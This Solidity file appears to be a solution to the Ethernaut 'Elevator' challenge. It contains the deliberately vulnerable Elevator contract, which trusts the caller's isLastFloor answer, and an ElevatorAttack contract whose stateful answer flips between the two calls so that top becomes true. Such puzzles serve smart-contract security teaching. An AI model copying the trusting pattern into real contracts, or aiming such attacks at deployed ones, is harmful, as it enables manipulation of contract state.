// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract ElevatorAttack is Building{
    Elevator elevator;
    uint count;

    constructor(address _Elevator){
        elevator = Elevator(_Elevator);
        count = 0;
    }

    function isLastFloor(uint) external returns (bool){
        if(count == 0){
            count = count +1;
            return false;
        }else{
            return true;
        }
    }

    function Attack() public{
        elevator.goTo(10);
    }
}